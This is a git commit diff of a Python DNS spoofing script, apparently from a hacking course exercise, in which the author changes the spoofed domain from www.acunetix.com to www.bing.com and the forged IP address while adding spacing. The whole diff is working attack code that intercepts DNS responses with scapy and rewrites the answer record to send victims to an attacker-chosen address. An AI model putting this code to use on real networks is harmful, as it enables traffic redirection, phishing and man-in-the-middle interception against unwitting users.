5fc1a4c2b0f1aa1c89b7400a3e0c6e972e9d9e4c
Michael Zick <michaelzick@gmail.com>
2022-08-18 15:34:06 -0700

    Spaced things out

--- dns_spoofer.py
+++ dns_spoofer.py
@@ -8,16 +8,20 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if 'www.acunetix.com' in str(qname):
+
+        if 'www.bing.com' in str(qname):
             print('[+] Spoofing target.')
-            answer = scapy.DNSRR(rrname=qname, rdata='10.211.55.4')
+            answer = scapy.DNSRR(rrname=qname, rdata='142.250.189.14')
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
+
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
             del scapy_packet[scapy.UDP].len
             del scapy_packet[scapy.UDP].chksum
+
             packet.set_payload(bytes(scapy_packet))
+
     # packet.drop()
     packet.accept()
 
